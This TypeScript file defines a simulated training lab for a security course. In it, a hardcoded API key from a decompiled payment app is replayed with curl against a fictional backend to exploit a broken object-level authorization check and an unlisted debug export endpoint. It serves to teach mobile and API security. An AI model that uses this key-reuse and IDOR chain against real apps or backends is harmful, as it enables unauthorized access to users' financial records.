import { dir, file } from '../vfs';
import type { LabScenario, HostDef } from '../types';

function reviewer(files: Record<string, ReturnType<typeof file> | ReturnType<typeof dir>>) {
  return { hostname: 'mobile-review-ws', user: 'root', root: dir({ root: dir(files) }) };
}

/** Mobile module capstone: one continuous five-flag chain from static APK analysis straight through to
 *  full backend compromise — a hardcoded API key found in decompiled source, used directly against the
 *  real backend entirely bypassing the app, then chained into BOLA and an admin debug endpoint — instead
 *  of isolated static-analysis-only or backend-only labs. Combines the `reviewer()` static-analysis
 *  convention with the `curl`+`vulnRoutes` live-backend convention `mobile-pack.ts`'s
 *  `mobile-bola-intercepted-api-replay` lab already established. */
export const mobileCapstoneLabs: LabScenario[] = [
  {
    id: 'mobile-capstone-hardcoded-key-to-backend-compromise',
    title: 'Capstone: A Hardcoded API Key in Decompiled Source Reaches Full Backend Compromise',
    difficulty: 'Hard',
    category: 'Mobile',
    briefing:
      "PayWave's Android app was decompiled as part of a routine mobile app assessment. Buried in a " +
      'configuration class is a hardcoded backend API key — not a secret meant for the app to hold at all, ' +
      "since anything shipped in an APK is recoverable by anyone with five minutes and a decompiler. From that " +
      "one static-analysis finding, chain straight into the real backend: authenticate with the key entirely " +
      "outside the app, pull another user's transaction history through a broken authorization check, and " +
      "finally reach an internal debug endpoint the key was never meant to unlock.",
    objectives: [
      { text: 'cat app_source/com/paywave/config/ApiConfig.java and capture the first flag', why: 'Anything hardcoded into an APK is fully recoverable by decompiling it — there is no such thing as a client-side secret on a platform the end user fully controls.' },
      { text: 'curl -H "X-PayWave-Key: PW-LIVE-8f3a9c2e" http://10.10.270.5/v1/account/balance and capture the second flag', why: 'Confirms the key recovered from decompiled source is a live, working backend credential — usable with nothing but curl, no app installation required at all.' },
      { text: 'curl -H "X-PayWave-Key: PW-LIVE-8f3a9c2e" "http://10.10.270.5/v1/account/transactions?user_id=90233" and capture the third flag', why: "The transactions endpoint trusts whatever user_id is requested with no ownership check at all — a classic BOLA, reached this time through a decompiled API key instead of a stolen session token." },
      { text: 'cat app_source/com/paywave/config/DebugConfig.java to find the hidden debug endpoint path', why: 'Debug/diagnostic endpoints left in production builds are a recurring real finding — often gated by nothing more than a "security through obscurity" unlisted path.' },
      { text: 'curl -H "X-PayWave-Key: PW-LIVE-8f3a9c2e" http://10.10.270.5/v1/_internal/debug/export-all and capture the final flag', why: 'This is the actual endpoint of the chain: the same key recovered from a decompiled APK, three steps later, pulling a full account export from an endpoint that was never meant to be reachable outside internal tooling at all.' },
    ],
    hints: [
      'cat app_source/com/paywave/config/ApiConfig.java',
      'curl -H "X-PayWave-Key: PW-LIVE-8f3a9c2e" http://10.10.270.5/v1/account/balance',
      'curl -H "X-PayWave-Key: PW-LIVE-8f3a9c2e" "http://10.10.270.5/v1/account/transactions?user_id=90233"',
      'cat app_source/com/paywave/config/DebugConfig.java',
      'curl -H "X-PayWave-Key: PW-LIVE-8f3a9c2e" http://10.10.270.5/v1/_internal/debug/export-all',
    ],
    totalFlags: 5,
    attacker: reviewer({
      app_source: dir({
        com: dir({
          paywave: dir({
            config: dir({
              'ApiConfig.java': file(
                [
                  'public class ApiConfig {',
                  '    public static final String BASE_URL = "http://10.10.270.5/v1/";',
                  '    public static final String API_KEY = "PW-LIVE-8f3a9c2e";  // TODO: move to remote config before GA (never done)',
                  '}',
                  '-- anything hardcoded here ships inside the APK itself, fully recoverable by any decompiler --',
                  'flag{hardcoded_backend_api_key_recovered_from_decompiled_apk}',
                  '',
                ].join('\n'),
              ),
              'DebugConfig.java': file(
                [
                  'public class DebugConfig {',
                  '    // left in the production build by mistake — gated only by an unlisted path, not real authentication',
                  '    public static final String DEBUG_EXPORT_PATH = "/v1/_internal/debug/export-all";',
                  '}',
                  '-- a debug endpoint gated only by an unlisted path is security through obscurity, not real access control --',
                  'flag{debug_endpoint_path_recovered_from_decompiled_source}',
                  '',
                ].join('\n'),
              ),
            }),
          }),
        }),
      }),
    }),
    network: [
      {
        hostname: 'paywave-api-01',
        ip: '10.10.270.5',
        os: 'Ubuntu 22.04 (PayWave backend API)',
        services: [
          {
            port: 80,
            name: 'http',
            version: 'nginx 1.24.0 + Node.js API gateway',
            http: {},
            vulnRoutes: [
              {
                kind: 'auth-bypass',
                path: '/v1/account/balance',
                param: 'X-PayWave-Key',
                location: 'header',
                triggerSubstrings: ['pw-live-8f3a9c2e'],
                vulnerableResponse: '{"user_id":"self","balance_usd":4210.55,"flag":"flag{decompiled_api_key_authenticates_directly_no_app_needed}"}',
                normalResponse: '{"error":"401 unauthorized"}',
              },
              {
                kind: 'idor',
                path: '/v1/account/transactions',
                param: 'user_id',
                triggerSubstrings: ['90233'],
                vulnerableResponse: '{"user_id":90233,"owner":"K. Whitfield","transactions":184,"total_usd":92210.40,"flag":"flag{transactions_endpoint_bola_no_ownership_check}"}',
                normalResponse: '{"error":"no transactions found for this key\'s owner"}',
              },
              {
                kind: 'auth-bypass',
                path: '/v1/_internal/debug/export-all',
                param: 'X-PayWave-Key',
                location: 'header',
                triggerSubstrings: ['pw-live-8f3a9c2e'],
                vulnerableResponse: '{"status":"export_complete","accounts":88213,"note":"debug endpoint gated only by obscurity, not real authorization","flag":"flag{decompiled_key_reaches_internal_debug_export_endpoint}"}',
                normalResponse: '{"error":"404 not found"}',
              },
            ],
          },
        ],
        users: [],
        root: dir({}),
      } as HostDef,
    ],
  },
];
